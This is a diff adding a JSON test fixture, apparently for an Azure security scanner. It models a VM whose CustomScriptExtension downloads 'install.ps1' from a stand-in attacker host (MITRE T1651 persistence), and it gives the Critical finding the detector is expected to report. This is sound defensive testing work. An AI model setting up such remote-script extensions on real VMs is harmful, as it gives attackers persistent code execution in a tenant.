@@ -1,0 +1,30 @@
+{
+  "scenario": "VM has a CustomScriptExtension whose settings.fileUris point to an attacker-controlled URL outside the tenant. Documented as BloodHound-Azure AZExecuteCommand and MicroBurst Invoke-AzureRmVMRunCommand style persistence.",
+  "mitre_id": "T1651",
+  "virtual_machines": [
+    {
+      "name": "db-prod-01",
+      "resource_group": "rg-db-prod",
+      "resource_id": "/subscriptions/11111111-2222-3333-4444-555555555555/resourceGroups/rg-db-prod/providers/Microsoft.Compute/virtualMachines/db-prod-01",
+      "extensions": [
+        {
+          "name": "InstallHelper",
+          "type_properties_type": "CustomScriptExtension",
+          "publisher": "Microsoft.Compute",
+          "settings": {
+            "fileUris": [
+              "https://attacker.example.com/install.ps1"
+            ]
+          }
+        }
+      ]
+    }
+  ],
+  "expected_finding": {
+    "detector": "suspicious_vm_extension",
+    "vm_name": "db-prod-01",
+    "extension_type": "CustomScriptExtension",
+    "mitre_technique_id": "T1651",
+    "risk": "Critical"
+  }
+}
